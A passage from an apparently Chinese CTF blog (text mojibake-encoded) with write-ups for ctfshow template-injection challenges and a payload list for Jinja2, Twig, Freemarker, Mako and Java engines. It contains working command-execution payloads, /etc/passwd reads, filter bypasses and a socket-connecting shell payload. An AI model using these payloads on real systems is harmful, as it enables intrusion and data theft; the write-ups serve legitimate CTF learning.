Gecko) Chrome/104.0.0.0 Safari/537.36&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    url = <span class="string">&quot;http://127.0.0.1:5000/?name=\</span></span><br><span class="line"><span class="string">        &#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;]&#125;&#125;&quot;</span></span><br><span class="line">    res = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="comment">#print(res.text)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;os._wrap_close&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20230408161509018.png" alt="image-20230408161509018"></p><p>å¯ä»¥çœ‹åˆ°oså¯ä»¥ä½¿ç”¨ï¼Œåœ¨132ä½</p><p><code>&#123;&#123;"".__class__.__mro__[-1].__subclasses__()[132]&#125;&#125;</code></p><p>ç¬¬äº”æ­¥ï¼Œç»§ç»­æ„é€ ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥åˆ©ç”¨<code>osã€‚_wrap_close</code>ï¼Œè¿™ä¸ªç±»ä¸­æœ‰<code>popen</code>æ–¹æ³•ï¼Œæˆ‘ä»¬å»è°ƒç”¨å®ƒ</p><p>å…ˆè°ƒç”¨å®ƒçš„__init__æ–¹æ³•è¿›è¡Œåˆå§‹åŒ–ç±»</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">name=&#123;&#123;&quot;&quot;.__class__.__bases__[0]. __subclasses__()[132].__init__&#125;&#125;</span><br><span class="line">è¿”å›</span><br><span class="line">//&lt;function _wrap_close.__init__ at 0x7f37bfb745e0&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ç„¶åå†è°ƒç”¨__globals__è·å–åˆ°æ–¹æ³•å†…ä»¥å­—å…¸çš„å½¢å¼è¿”å›çš„æ–¹æ³•ã€å±æ€§ç­‰</span><br><span class="line">name=&#123;&#123;&quot;&quot;.__class__.__bases__[0]. __subclasses__()[132].__init__.__globals__&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20230409220834519.png" alt="image-20230409220834519"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name=&#123;&#123;&quot;&quot;.__class__.__bases__[0]. __subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;dir&#x27;).read()&#125;&#125;</span><br><span class="line">name=&#123;&#123;&quot;&quot;.__class__.__bases__[0]. __subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;id&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20230409220943551.png" alt="image-20230409220943551"></p><p>å³å¯å‘½ä»¤æ‰§è¡Œäº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://5dc9087f-a33a-43fd-89f6-729c41675180.challenge.ctf.show/?name=&#123;&#123;&quot;&quot;.__class__.__bases__[0]. __subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="web362-å¼€å§‹è¿‡æ»¤"><a href="#web362-å¼€å§‹è¿‡æ»¤" class="headerlink" title="web362 å¼€å§‹è¿‡æ»¤"></a>web362 å¼€å§‹è¿‡æ»¤</h4><p>ä¸æ¸…æ¥šè¿‡æ»¤äº†ä»€ä¹ˆï¼Œfuzzä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;4*4&#125;&#125;[[5*5]]</span><br><span class="line">&#123;&#123;7*7&#125;&#125;</span><br><span class="line">&#123;&#123;7*&#x27;7&#x27;&#125;&#125;</span><br><span class="line">&lt;%= 7 * 7 %&gt;</span><br><span class="line">$&#123;3*3&#125;</span><br><span class="line">$&#123;&#123;7*7&#125;&#125;</span><br><span class="line">@(1+2)</span><br><span class="line">#&#123;3*3&#125;</span><br><span class="line">#&#123; 7 * 7 &#125;</span><br><span class="line">&#123;&#123;dump(app)&#125;&#125;</span><br><span class="line">&#123;&#123;app.request.server.all|join(&#x27;,&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;config.items()&#125;&#125;</span><br><span class="line">&#123;&#123; [].class.base.subclasses() &#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;&#x27;.class.mro()[1].subclasses()&#125;&#125;</span><br><span class="line">&#123;&#123; &#x27;&#x27;.__class__.__mro__[2].__subclasses__() &#125;&#125;</span><br><span class="line">&#123;% for key, value in config.iteritems() %&#125;&lt;dt&gt;&#123;&#123; key|e &#125;&#125;&lt;/dt&gt;&lt;dd&gt;&#123;&#123; value|e &#125;&#125;&lt;/dd&gt;&#123;% endfor %&#125;</span><br><span class="line">&#123;&#123;&#x27;a&#x27;.toUpperCase()&#125;&#125; </span><br><span class="line">&#123;&#123; request &#125;&#125;</span><br><span class="line">&#123;&#123;self&#125;&#125;</span><br><span class="line">&lt;%= File.open(&#x27;/etc/passwd&#x27;).read %&gt;</span><br><span class="line">&lt;#assign ex = &quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123; ex(&quot;id&quot;)&#125;</span><br><span class="line">[#assign ex = &#x27;freemarker.template.utility.Execute&#x27;?new()]$&#123; ex(&#x27;id&#x27;)&#125;</span><br><span class="line">$&#123;&quot;freemarker.template.utility.Execute&quot;?new()(&quot;id&quot;)&#125;</span><br><span class="line">&#123;&#123;app.request.query.filter(0,0,1024,&#123;&#x27;options&#x27;:&#x27;system&#x27;&#125;)&#125;&#125;</span><br><span class="line">&#123;&#123; &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read() &#125;&#125;</span><br><span class="line">&#123;&#123; config.items()[4][1].__class__.__mro__[2].__subclasses__()[40](&quot;/etc/passwd&quot;).read() &#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.mro()[1].__subclasses__()[396](&#x27;cat flag.txt&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;% for x in ().__class__.__base__.__subclasses__() %&#125;&#123;% if &quot;warning&quot; in x.__name__ %&#125;&#123;&#123;x()._module.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(request.args.input).read()&#125;&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</span><br><span class="line">&#123;$smarty.version&#125;</span><br><span class="line">&#123;php&#125;echo `id`;&#123;/php&#125;</span><br><span class="line">&#123;&#123;[&#x27;id&#x27;]|filter(&#x27;system&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&#x27;cat\x20/etc/passwd&#x27;]|filter(&#x27;system&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&#x27;cat$IFS/etc/passwd&#x27;]|filter(&#x27;system&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)&#125;&#125;</span><br><span class="line">&#123;&#123;request|attr([&quot;_&quot;*2,&quot;class&quot;,&quot;_&quot;*2]|join)&#125;&#125;</span><br><span class="line">&#123;&#123;request|attr([&quot;__&quot;,&quot;class&quot;,&quot;__&quot;]|join)&#125;&#125;</span><br><span class="line">&#123;&#123;request|attr(&quot;__class__&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;request.__class__&#125;&#125;</span><br><span class="line">&#123;&#123;request|attr(&#x27;application&#x27;)|attr(&#x27;\x5f\x5fglobals\x5f\x5f&#x27;)|attr(&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;)(&#x27;\x5f\x5fbuiltins\x5f\x5f&#x27;)|attr(&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;)(&#x27;\x5f\x5fimport\x5f\x5f&#x27;)(&#x27;os&#x27;)|attr(&#x27;popen&#x27;)(&#x27;id&#x27;)|attr(&#x27;read&#x27;)()&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;a&#x27;.getClass().forName(&#x27;javax.script.ScriptEngineManager&#x27;).newInstance().getEngineByName(&#x27;JavaScript&#x27;).eval(\&quot;new java.lang.String(&#x27;xxx&#x27;)\&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;a&#x27;.getClass().forName(&#x27;javax.script.ScriptEngineManager&#x27;).newInstance().getEngineByName(&#x27;JavaScript&#x27;).eval(\&quot;var x=new java.lang.ProcessBuilder; x.command(\\\&quot;whoami\\\&quot;); x.start()\&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;a&#x27;.getClass().forName(&#x27;javax.script.ScriptEngineManager&#x27;).newInstance().getEngineByName(&#x27;JavaScript&#x27;).eval(\&quot;var x=new java.lang.ProcessBuilder; x.command(\\\&quot;netstat\\\&quot;); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;a&#x27;.getClass().forName(&#x27;javax.script.ScriptEngineManager&#x27;).newInstance().getEngineByName(&#x27;JavaScript&#x27;).eval(\&quot;var x=new java.lang.ProcessBuilder; x.command(\\\&quot;uname\\\&quot;,\\\&quot;-a\\\&quot;); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\&quot;)&#125;&#125;</span><br><span class="line">&#123;% for x in ().__class__.__base__.__subclasses__() %&#125;&#123;% if &quot;warning&quot; in x.__name__ %&#125;&#123;&#123;x()._module.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&quot;python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;ip\&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/cat\&quot;, \&quot;flag.txt\&quot;]);&#x27;&quot;).read().zfill(417)&#125;&#125;&#123;%endif%&#125;&#123;% endfor %&#125;</span><br><span class="line">$&#123;T(java.lang.System).getenv()&#125;</span><br><span class="line">$&#123;T(java.lang.Runtime).getRuntime().exec(&#x27;cat etc/passwd&#x27;)&#125;</span><br><span class="line">$&#123;T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())&#125;$&#123;self.module.cache.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.runtime.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template.module.cache.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.cache.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.__init__.__globals__[&#x27;util&#x27;].os.system(&#x27;id&#x27;)&#125;</span><br><span class="line">$&#123;self.template.module.runtime.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.filters.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.runtime.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.runtime.exceptions.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template.__init__.__globals__[&#x27;os&#x27;].system(&#x27;id&#x27;)&#125;</span><br><span class="line">$&#123;self.module.cache.util.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.runtime.util.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template._mmarker.module.cache.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template.module.cache.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.cache.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template._mmarker.module.runtime.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.attr._NSAttr__parent.module.cache.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template.module.filters.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template.module.runtime.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.filters.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.runtime.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template.module.runtime.exceptions.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.attr._NSAttr__parent.module.runtime.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.context._with_template.module.cache.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.runtime.exceptions.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template.module.cache.util.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.context._with_template.module.runtime.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.cache.util.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template.module.runtime.util.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.runtime.util.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.runtime.exceptions.traceback.linecache.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.runtime.exceptions.util.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template._mmarker.module.cache.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template.module.cache.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.attr._NSAttr__parent.template.module.cache.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template._mmarker.module.filters.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template._mmarker.module.runtime.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.attr._NSAttr__parent.module.cache.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template._mmarker.module.runtime.exceptions.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template.module.filters.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template.module.runtime.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.attr._NSAttr__parent.template.module.runtime.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.context._with_template._mmarker.module.cache.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template.module.runtime.exceptions.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.attr._NSAttr__parent.module.filters.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.context._with_template.module.cache.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.module.runtime.exceptions.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.context._with_template._mmarker.module.runtime.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.context._with_template.module.filters.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.context._with_template.module.runtime.compat.inspect.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.context._with_template.module.runtime.exceptions.util.os.system(&quot;id&quot;)&#125;</span><br><span class="line">$&#123;self.template.module.runtime.exceptions.traceback.linecache.os.system(&quot;id&quot;)&#125;</span><br><span class="line">&#123;&#123;self._TemplateReference__context.cycler.__init__.__globals__.os&#125;&#125;</span><br><span class="line">&#123;&#123;self._TemplateReference__context.joiner.__init__.__globals__.os&#125;&#125;</span><br><span class="line">&#123;&#123;self._TemplateReference__context.namespace.__init__.__globals__.os&#125;&#125;</span><br><span class="line">&#123;&#123;cycler.__init__.__globals__.os&#125;&#125;</span><br><span class="line">&#123;&#123;joiner.__init__.__globals__.os&#125;&#125;</span><br><span class="line">&#123;&#123;namespace.__init__.__globals__.os&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&quot;</span><br><span class="line">&quot;&quot;</span><br><span class="line">.</span><br><span class="line">_</span><br><span class="line">__</span><br><span class="line">[</span><br><span class="line">]</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#x27;</span><br><span class="line">&#x27;&#x27;</span><br><span class="line">class</span><br><span class="line">base</span><br><span class="line">bases</span><br><span class="line">subclasses</span><br><span class="line">(</span><br><span class="line">)</span><br><span class="line">()</span><br><span class="line">a</span><br><span class="line">b</span><br><span class="line">c</span><br><span class="line">d</span><br><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20230409222145988.png" alt="image-20230409222145988"></p><p>ä¼¼ä¹è¿‡æ»¤äº†2å’Œ3</p><p>ç»•è¿‡æ•°å­—ï¼Œéšä¾¿ç”¨ä¸€ä¸ªå­—æ¯å°±è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;c.__init__&#125;&#125;</span><br><span class="line">?name=&#123;&#123;bohemian.__init__.__globals__&#125;&#125;</span><br><span class="line">?name=&#123;&#123;bohemian.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]&#125;&#125;</span><br><span class="line">æœ‰<span class="built_in">eval</span>äº†</span><br><span class="line">?name=&#123;&#123;bohemian.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>) &#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20230409222556134.png" alt="image-20230409222556134"></p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20230409222730355.png" alt="image-20230409222730355"></p><h4 id="web363"><a href="#web363" class="headerlink" title="web363"></a>web363</h4><p>fuzzä¸€ä¸‹ï¼Œè¿‡æ»¤äº†å•åŒå¼•å·,å¯ä»¥ä½¿ç”¨åœ†æ‹¬å·åŠargs get æˆ–post æˆ– cookieå‚æ•°</p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20230409223204317.png" alt="image-20230409223204317"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">request.args.b</span><br><span class="line">request.values.b</span><br><span class="line">request.cookies.b</span><br><span class="line"></span><br><span class="line">æº</span><br><span class="line">http://76d85bcd-ec44-4686-965c-bddb2b8af3fd.challenge.ctf.show/?name=&#123;&#123;bohemian.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">//å°†å¸¦å¼•å·çš„popenå’Œlsæ¢æ‰å³å¯</span><br><span class="line">payload</span><br><span class="line">http://76d85bcd-ec44-4686-965c-bddb2b8af3fd.challenge.ctf.show/?name=&#123;&#123;bohemian.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[request.args.a](request.args.b).read()&#125;&#125;&amp;a=popen&amp;b=cat /flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2</span><br><span class="line">http://76d85bcd-ec44-4686-965c-bddb2b8af3fd.challenge.ctf.show/?name=&#123;&#123;bohemian.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[request.values.a](request.values.b).read()&#125;&#125;&amp;a=popen&amp;b=cat /flag</span><br></pre></td></tr></table></figure><h4 id="web364"><a href="#web364" class="headerlink" title="web364"></a>web364</h4><p>å¥½åƒå’Œ363ä¸€æ ·è¿‡æ»¤äº†å•åŒå¼•å·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://be1c7d5b-82ba-4405-a533-0fc2b28c9dff.challenge.ctf.show/?name=&#123;&#123;bohemian.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[request.values.a](request.values.b).read()&#125;&#125;&amp;a=popen&amp;b=cat /flag</span><br></pre></td></tr></table></figure><h4 id="365"><a href="#365" class="headerlink" title="365"></a>365</h4><p>è¿‡æ»¤äº†[]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://82ab42e3-eae4-4c5b-80f5-83fae500e217.challenge.ctf.show/?name=&#123;&#123;url_for.__globals__.os.popen(request.values.c).read()&#125;&#125;&amp;c=id</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow </tag>
            
            <tag> ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow-ç¬¬ä¸‰å±Šæ„šäººæ¯web-wp</title>
      <link href="/2023/04/06/CTFshow-%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%84%9A%E4%BA%BA%E6%9D%AFweb-wp/"/>
      <url>/2023/04/06/CTFshow-%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%84%9A%E4%BA%BA%E6%9D%AFweb-wp/</url>
      
        <content type="html"><![CDATA[<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="easy-signin"><a href="#easy-signin" class="headerlink" title="easy_signin"></a>easy_signin</h4><p><a href="https://ctf.show/challenges#easy_signin-3967">https://ctf.show/challenges#easy_signin-3967</a></p><p>é¦–å…ˆç»™åˆ°ä¸€ä¸ªurl</p><p><a href="http://f43e5622-a292-404c-98b5-85b54f0450d8.challenge.ctf.show/?img=ZmFjZS5wbmc=">http://f43e5622-a292-404c-98b5-85b54f0450d8.challenge.ctf.show/?img=ZmFjZS5wbmc=</a></p><p>urlåimgä¸ºbase64  ZmFjZS5wbmc=   =&gt; face.png</p><p>é‚£å¯ä»¥ç›´æ¥è¯»å–æºç ï¼Œindex.php,    index.php  =&gt; aW5kZXgucGhw</p><p>å³é”®æŸ¥çœ‹æºä»£ç å³å¯çœ‹åˆ°</p><img src='data:image/png;base64,PD9waHAKLyoKIyAtKi0gY29kaW5nOiB1dGYtOCAtKi0KIyBAQXV0aG9yOiBoMXhhCiMgQERhdGU6ICAgMjAyMy0wMy0yNyAxMDozMDozMAojIEBMYXN0IE1vZGlmaWVkIGJ5OiAgIGgxeGEKIyBATGFzdCBNb2RpZmllZCB0aW1lOiAyMDIzLTAzLTI4IDEyOjE1OjMzCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQojIEBsaW5rOiBodHRwczovL2N0ZmVyLmNvbQoKKi8KCiRpbWFnZT0kX0dFVFsnaW1nJ107CgokZmxhZyA9ICJjdGZzaG93ezRjNzJiODAwLTMzNjQtNGQ1NC05YWU0LTIwYTE4YzYxYTMxZn0iOwppZihpc3NldCgkaW1hZ2UpKXsKCSRpbWFnZSA9IGJhc2U2NF9kZWNvZGUoJGltYWdlKTsKCSRkYXRhID0gYmFzZTY0X2VuY29kZShmaWxlX2dldF9jb250ZW50cygkaW1hZ2UpKTsKCWVjaG8gIjxpbWcgc3JjPSdkYXRhOmltYWdlL3BuZztiYXNlNjQsJGRhdGEnLz4iOwp9ZWxzZXsKCSRpbWFnZSA9IGJhc2U2NF9lbmNvZGUoImZhY2UucG5nIik7CgloZWFkZXIoImxvY2F0aW9uOi8/aW1nPSIuJGltYWdlKTsKfQoKCgoK'/><p>pd9å¼€å¤´ä¸º&lt;?php ç›´æ¥è§£å¯†å³å¯</p><p><img src="/images/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230406144147722.png" alt="image-20230406144147722"></p><h4 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h4><p><a href="https://ctf.show/challenges#easy_flask-3971">https://ctf.show/challenges#easy_flask-3971</a></p><p>æ‰“å¼€é¢˜ç›®è¿æ¥æ˜¯ä¸€ä¸ªç™»å½•æ¡†ï¼Œå¯ä»¥è¿›è¡Œç”¨æˆ·æ³¨å†Œ</p><p>å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« 